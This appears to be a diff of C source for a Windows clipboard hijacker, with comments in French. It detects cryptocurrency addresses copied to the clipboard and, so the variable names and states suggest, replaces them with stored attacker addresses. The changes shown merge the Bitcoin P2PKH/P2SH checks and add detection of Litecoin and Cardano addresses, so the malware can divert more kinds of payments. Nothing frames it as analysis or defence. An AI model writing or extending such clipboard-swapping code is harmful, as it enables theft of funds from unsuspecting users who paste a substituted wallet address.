@@ -50,16 +50,16 @@ StateCodeProcess main(void)
 
                 int text_size = wcslen(buffer);
 
-                // -------------------------------------------------- Vérification Bitcoin
                 // Vérification adresse déjà enregistrée
-                if (wcscmp(buffer, bitcoin_address) == 0) {
+                if (wcscmp(buffer, bitcoin_address) == 0 || wcscmp(buffer, litecoin_address) == 0 || wcscmp(buffer, cardano_address) == 0) {
                     Sleep(500);
                     state = STATE_CLEAN_CLIPBOARD;
                     break;
                 }
 
-                // Vérification adresse P2PKH
-                if (buffer[0] == L'1') {
+                // -------------------------------------------------- Vérification Bitcoin
+                // Vérification adresse P2PKH et P2SH
+                if (buffer[0] == L'1' || buffer[0] == L'3') {
                     if (text_size >= 26 && text_size <= 35) {
                         cryptocurrency = BITCOIN;
                         Sleep(500);
@@ -68,17 +68,7 @@ StateCodeProcess main(void)
                     }
                 }
 
-                // Vérification adresse P2SH
-                if (buffer[0] == L'3') {
-                    if (text_size >= 26 && text_size <= 35) {
-                        cryptocurrency = BITCOIN;
-                        Sleep(500);
-                        state = STATE_MODIFY_CLIPBOARD;
-                        break;
-                    }
-                }
-
-                // Vérification adresse Bech32
+                // // Vérification adresse Bech32
                 if (buffer[0] == L'b' && buffer[1] == L'c' && buffer[2] == L'1' && buffer[3] == L'q') {
                     if (text_size == 42 || text_size == 62) {
                         cryptocurrency = BITCOIN;
@@ -88,10 +78,32 @@ StateCodeProcess main(void)
                     }
                 }
 
-                // Vérification adresse Bech32m
+                // // Vérification adresse Bech32m
                 if (buffer[0] == L'b' && buffer[1] == L'c' && buffer[2] == L'1' && buffer[3] == L'p') {
                     if (text_size == 62) {
                         cryptocurrency = BITCOIN;
+                        Sleep(500);
+                        state = STATE_MODIFY_CLIPBOARD;
+                        break;
+                    }
+                }
+
+                // -------------------------------------------------- Vérification Litecoin
+                // Vérification adresse Legacy et Bech32
+                if (buffer[0] == L'L' || buffer[0] == L'M' || (buffer[0] == L'l' && buffer[1] == L't' && buffer[2] == L'c' && buffer[3] == L'1')) {
+                    if (text_size >= 26 && text_size <= 35) {
+                        cryptocurrency = LITECOIN;
+                        Sleep(500);
+                        state = STATE_MODIFY_CLIPBOARD;
+                        break;
+                    }
+                }
+
+                // -------------------------------------------------- Vérification Cardano
+                // Vérification adresse Shelley
+                if (buffer[0] == L'a' && buffer[1] == L'd' && buffer[2] == L'd' && buffer[3] == L'r' && buffer[4] == L'1') {
+                    if (text_size >= 58 && text_size <= 110) {
+                        cryptocurrency = CARDANO;
                         Sleep(500);
                         state = STATE_MODIFY_CLIPBOARD;
                         break;
